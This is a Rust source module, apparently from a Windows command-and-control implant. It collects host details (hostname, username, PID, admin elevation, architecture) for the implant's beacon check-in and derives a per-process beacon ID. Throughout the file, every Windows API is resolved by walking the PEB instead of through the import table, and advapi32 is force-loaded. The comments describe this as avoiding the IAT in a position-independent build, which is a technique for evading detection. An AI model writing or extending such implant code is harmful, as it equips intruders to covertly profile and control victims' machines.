//! Real host enumeration for `SessionInfo` check-in.
//!
//! Replaces the M0 placeholders in `beacon.rs` (`hostname: "host"`,
//! `username: "user"`, `pid: 0`, `is_admin: 0`, `beacon_id: 0x1337`) with real
//! values resolved through the PEB walk — no IAT. Every API comes from
//! `kernel32.dll` (always loaded) or `advapi32.dll` (force-loaded via the same
//! `LoadLibraryA` trick `transport.rs` uses for `winhttp.dll`).
//!
//! `beacon_id` is derived from the `KUSER_SHARED_DATA` tick count (fixed user
//! mapping at `0x7FFE_0000`, always present, no syscall) mixed with the PID via
//! xorshift32 — so two implants on the same host still get distinct IDs without
//! pulling a CSPRNG into the no_std PIC build.

#![cfg(target_os = "windows")]

use crate::heap::String;
use crate::resolve::export_addr;
use core::ffi::c_void;

/// The fixed user-mode mapping of `KUSER_SHARED_DATA` on x64 Windows. Always
/// present, readable from user mode without a syscall. Offset 0x320 holds
/// `TickCountLow` (a u32 that changes per boot + over time) — a cheap entropy
/// source that differs across hosts and reboots.
const KUSER_SHARED_DATA: usize = 0x0000_0000_7FFE_0000;
const TICK_COUNT_OFFSET: usize = 0x320;

/// Force-load a DLL via the PEB-resolved `LoadLibraryA` (mirrors transport.rs).
/// Idempotent — Windows refcounts module loads.
fn force_load(dll: &[u8]) -> bool {
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let addr = match unsafe { export_addr(b"kernel32.dll", b"LoadLibraryA") } {
        Some(a) => a,
        None => return false,
    };
    let mut name = [0u8; 32];
    let n = dll.len().min(name.len() - 1);
    name[..n].copy_from_slice(&dll[..n]);
    let load: LoadLibraryA = unsafe { core::mem::transmute(addr) };
    !unsafe { load(name.as_ptr()) }.is_null()
}

/// Hand-rolled UTF-16 → lossy `String` (no `from_utf8_lossy` under no_std).
fn utf16_to_string(wide: &[u16]) -> String {
    let mut bytes = crate::heap::Vec::with_capacity(wide.len());
    for &w in wide {
        if w == 0 {
            break;
        }
        let w = w as u32;
        if w < 0x80 {
            bytes.push(w as u8);
        } else if w < 0x800 {
            bytes.push(0xC0 | (w >> 6) as u8);
            bytes.push(0x80 | (w & 0x3F) as u8);
        } else {
            bytes.push(0xE0 | (w >> 12) as u8);
            bytes.push(0x80 | ((w >> 6) & 0x3F) as u8);
            bytes.push(0x80 | (w & 0x3F) as u8);
        }
    }
    match String::from_utf8(bytes) {
        Ok(s) => s,
        // Fall back to a lossy rebuild if (somehow) the UTF-8 we just emitted
        // is invalid — it shouldn't be, but never panic on host info.
        Err(e) => {
            let mut out = String::new();
            for &b in e.as_bytes() {
                if b.is_ascii() {
                    out.push(b as char);
                } else {
                    out.push('\u{FFFD}');
                }
            }
            out
        }
    }
}

/// `GetComputerNameW` → hostname, or `"host"` on resolution failure.
pub fn hostname() -> String {
    type GetComputerNameW = unsafe extern "system" fn(*mut u16, *mut u32) -> i32;
    let f: GetComputerNameW = match unsafe { export_addr(b"kernel32.dll", b"GetComputerNameW") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return String::from("host"),
    };
    let mut len: u32 = 256;
    let mut buf = crate::heap::vec![0u16; 256];
    if unsafe { f(buf.as_mut_ptr(), &mut len) } != 0 && len > 0 {
        utf16_to_string(&buf[..len as usize])
    } else {
        String::from("host")
    }
}

/// `GetCurrentProcessId` → PID. Never fails on a real host.
pub fn pid() -> u32 {
    type GetCurrentProcessId = unsafe extern "system" fn() -> u32;
    match unsafe { export_addr(b"kernel32.dll", b"GetCurrentProcessId") } {
        Some(a) => {
            let f: GetCurrentProcessId = unsafe { core::mem::transmute(a) };
            unsafe { f() }
        }
        None => 0,
    }
}

/// `GetUserNameW` → username, or `"user"` on failure. Needs `advapi32.dll`
/// (force-loaded; not present by default in a minimal process).
pub fn username() -> String {
    if !force_load(b"advapi32.dll") {
        return String::from("user");
    }
    type GetUserNameW = unsafe extern "system" fn(*mut u16, *mut u32) -> i32;
    let f: GetUserNameW = match unsafe { export_addr(b"advapi32.dll", b"GetUserNameW") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return String::from("user"),
    };
    let mut len: u32 = 256;
    let mut buf = crate::heap::vec![0u16; 256];
    if unsafe { f(buf.as_mut_ptr(), &mut len) } != 0 && len > 0 {
        utf16_to_string(&buf[..len as usize])
    } else {
        String::from("user")
    }
}

/// Detect an elevated (admin) token via `OpenProcessToken` +
/// `GetTokenInformation`(TokenElevation). Returns 1 if elevated, 0 otherwise.
///
/// This is preferred over `shell32!IsUserAnAdmin` because it needs only
/// `advapi32` + `kernel32` (already loaded/force-loaded here) and does not pull
/// in the much heavier `shell32`. `GetCurrentProcess` returns a pseudohandle
/// (-1) that needs no `CloseHandle`.
pub fn is_admin() -> u8 {
    if !force_load(b"advapi32.dll") {
        return 0;
    }
    type GetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;
    type OpenProcessToken = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
    type GetTokenInformation = unsafe extern "system" fn(
        *mut c_void,
        u32,         // TOKEN_INFORMATION_CLASS
        *mut c_void, // TokenInformation
        u32,         // TokenInformationLength
        *mut u32,    // ReturnLength
    ) -> i32;
    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;

    let gcp: GetCurrentProcess = match unsafe { export_addr(b"kernel32.dll", b"GetCurrentProcess") }
    {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return 0,
    };
    let opt: OpenProcessToken = match unsafe { export_addr(b"advapi32.dll", b"OpenProcessToken") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return 0,
    };
    let gti: GetTokenInformation =
        match unsafe { export_addr(b"advapi32.dll", b"GetTokenInformation") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return 0,
        };
    let close: CloseHandle = match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return 0,
    };

    // TOKEN_QUERY = 0x0008.
    let proc = unsafe { gcp() };
    let mut token: *mut c_void = core::ptr::null_mut();
    if unsafe { opt(proc, 0x0008, &mut token) } == 0 || token.is_null() {
        return 0;
    }
    // TokenElevation = 20 (TOKEN_INFORMATION_CLASS). TOKEN_ELEVATION is a 4-byte
    // DWORD; 4 is a safe buffer length.
    let mut elevated: u32 = 0;
    let mut retlen: u32 = 0;
    let ok = unsafe {
        gti(
            token,
            20,
            &mut elevated as *mut u32 as *mut c_void,
            4,
            &mut retlen,
        )
    };
    unsafe { close(token) };
    if ok != 0 {
        u8::from(elevated != 0)
    } else {
        0
    }
}

/// CPU architecture code matching `SessionInfo::arch`: 0 = x86_64, 1 = aarch64,
/// 2 = other. Compile-time — the implant only runs on the arch it was built for.
pub fn arch() -> u8 {
    if cfg!(target_arch = "x86_64") {
        0
    } else if cfg!(target_arch = "aarch64") {
        1
    } else {
        2
    }
}

/// Operating-system label for `SessionInfo::os` (always "Windows" for this
/// crate — it is gated to `target_os = "windows"`).
pub fn os() -> String {
    String::from("Windows")
}

/// Derive a per-process beacon id from `KUSER_SHARED_DATA`'s tick count mixed
/// with the PID via xorshift32. Distinct across hosts and reboots, and distinct
/// for two implants on the same host (different PIDs) — without needing a
/// CSPRNG (which would mean pulling `getrandom`/`rand` into the no_std build).
pub fn beacon_id() -> u32 {
    let tick = unsafe {
        // SAFETY: KUSER_SHARED_DATA is a fixed, always-mapped, user-readable
        // page. Reading a u32 at 0x320 (TickCountLow) is always safe.
        core::ptr::read_volatile((KUSER_SHARED_DATA + TICK_COUNT_OFFSET) as *const u32)
    };
    let mut x = tick ^ pid();
    if x == 0 {
        x = 0x9E37_79B9; // xorshift can't start at 0
    }
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    x
}
